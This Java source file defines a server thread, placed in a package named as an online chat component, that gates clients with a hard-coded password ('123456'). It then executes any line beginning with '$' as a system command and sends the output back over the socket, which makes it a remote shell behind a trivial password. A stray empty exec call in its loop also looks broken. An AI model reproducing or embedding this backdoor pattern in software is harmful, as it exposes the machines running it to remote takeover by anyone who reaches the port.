package com.virtualpuffer.onlineChat.chat;

import com.virtualpuffer.netdisk.service.impl.BaseServiceImpl;
import com.virtualpuffer.netdisk.utils.Log;

import java.io.*;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import java.util.LinkedList;

/**
 * 该类为多线程类，用于服务端
 */
public class ServerThread extends BaseServiceImpl implements Runnable{
    private Socket client = null;
    public static Socket socket = null;
    public int connectTag = 0;
    private static final Class threadLock = ServerThread.class;
    private static final PrintStream systemStream = System.out;
    public static final String CONNECTTEST_REQUEST = "ping";
    public static final String CONNECTTEST_RESPONSE = "pong";
    public static final String DISCONNECT_REQUEST = "bye";
    public static final String DISCONNECT_RESPONSE = "byebye111";
    public ServerThread(Socket client){
        this.client = client;
    }

    @Override
    public void run() {
        int tryTime = 0;
        String str = null;
        PrintStream out = null;
        boolean permit = true;

        synchronized (threadLock) {
            try {
                socket.close();
            } catch (Exception e) {
            }
            try {
                socket = this.client;
                socket.setSoTimeout(50000);
            } catch (SocketException e) {
            }
        }
        try {
            out = new PrintStream(socket.getOutputStream());
            BufferedReader buf = new BufferedReader(new InputStreamReader(client.getInputStream()));
            out.println("password: ");
            while (permit) {
                String get = buf.readLine();
                if ("123456".equals(get)) {
                    permit = false;
                } else if (tryTime > 2) {
                    return;
                } else if (CONNECTTEST_REQUEST.equals(get)) {
                    out.println(CONNECTTEST_RESPONSE);
                } else{
                tryTime++;
                out.println("please try again");
                out.println("password: ");
            }
        }
            System.setOut(out);
            socket.setSoTimeout(10000);
            out.println("欢迎回来，连接已建立，通信地址：" + socket.getRemoteSocketAddress());
            boolean flag = true;
            while (flag && !socket.isClosed()) {
                    Runtime.getRuntime().exec("");
                try {
                    str = buf.readLine();
                } catch (SocketTimeoutException e){
                    if(connectTag < 3){
                        out.println(ServerThread.CONNECTTEST_REQUEST);
                        connectTag ++;
                    }else {
                        out.println(DISCONNECT_RESPONSE);
                        return;
                    }
                }

                if (DISCONNECT_REQUEST.equals(str) && client.equals(socket)) {
                    out.println(DISCONNECT_RESPONSE);
                    return;
                }else if(CONNECTTEST_REQUEST.equals(str)){
                    out.println(CONNECTTEST_RESPONSE);
                }else if(CONNECTTEST_RESPONSE.equals(str)){
                    connectTag = 0;
                }else if(str.startsWith("$")){
                    try{
                        InputStream inputStream = Runtime.getRuntime().exec(str.substring(1)).getInputStream();
                        //
                        copy(inputStream,out);
                    }catch (Exception e){
                        out.println(e.getMessage());
                    }
                }
            }
        } catch (IOException ioException) {
            ioException.printStackTrace();
        } catch (Exception exception){
        }finally {
            System.setOut(systemStream);
            close(out);
        }
    }
}
